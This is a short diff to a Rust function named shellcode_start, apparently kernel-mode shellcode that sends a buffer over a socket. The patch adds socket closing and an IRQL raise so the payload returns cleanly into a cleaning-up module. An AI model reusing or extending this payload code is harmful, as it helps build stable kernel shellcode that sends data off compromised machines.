@@ -98,9 +98,12 @@ unsafe fn shellcode_start() -> Result<(), ntdef::types::NTSTATUS> {
             let _ = socket.send(buf as _, buf_len as _);
             ((*tdi_ctx).funcs.ex_free_pool_with_tag)(buf, 0);
             send = 0 as _;
+            _ = socket.close();
+            close = 1 as _;
         }
     }
-
+    // this is to avoid errors if returning to a cleaning-up module
+    _ = ((*tdi_ctx).funcs.ke_raise_irql_to_dpc_level)();
     Ok(())
 }
 
